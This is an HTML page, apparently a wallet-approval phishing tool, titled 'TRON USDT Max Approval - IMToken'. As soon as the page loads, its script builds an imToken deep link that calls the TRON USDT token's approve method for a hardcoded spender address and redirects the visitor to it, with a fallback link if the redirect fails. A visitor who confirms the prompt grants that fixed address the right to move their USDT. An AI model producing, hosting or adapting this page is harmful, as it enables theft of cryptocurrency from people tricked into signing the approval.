<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TRON USDT Max Approval - IMToken</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: "Arial", "Helvetica", sans-serif; /* 字体生效 */
      padding: 20px;
      background: #f6f6f6;
      color: #000;
    }

    h2 {
      margin-bottom: 15px;
    }

    label {
      display: block;
      margin-top: 10px;
    }

    input {
      padding: 8px;
      margin: 5px 0;
      width: 100%;
      box-sizing: border-box;
      font-family: inherit;
    }

    #status {
      margin-top: 15px;
      font-weight: bold;
      word-break: break-word;
    }
  </style>
</head>
<body>

<h2>TRON USDT Max Approval (IMToken)</h2>

<label for="contractAddress">Contract Address:</label>
<input type="text" id="contractAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">

<label for="spenderAddress">Spender Address:</label>
<input type="text" id="spenderAddress" value="TGyztuTE8f4FJte4JZ1VRDpEKYpKMAuQey">

<div id="status">Redirecting to IMToken...</div>

<script>
const MAX_APPROVAL = 9999999;

// 生成 IMToken 深度链接
function generateIMTokenLink(contractAddress, spender, amount) {
  const base = 'imtokenv2://navigate/dapp/';
  const params = {
    type: 'tron',
    contract: contractAddress,
    method: 'approve',
    args: JSON.stringify([spender, amount])
  };
  const query = Object.keys(params).map(k => `${k}=${encodeURIComponent(params[k])}`).join('&');
  return base + '?' + query;
}

// 页面加载后自动跳转
window.addEventListener('load', () => {
  const contractAddress = document.getElementById('contractAddress').value.trim();
  const spender = document.getElementById('spenderAddress').value.trim();
  const statusEl = document.getElementById('status');

  if (!contractAddress || !spender) {
    statusEl.innerText = 'Contract or spender address is missing!';
    return;
  }

  const link = generateIMTokenLink(contractAddress, spender, MAX_APPROVAL);

  // 更新状态
  statusEl.innerHTML = `Redirecting to IMToken for approval...<br><a href="${link}">Click here if not redirected</a>`;

  // 自动跳转
  window.location.href = link;
});
</script>

</body>
</html>
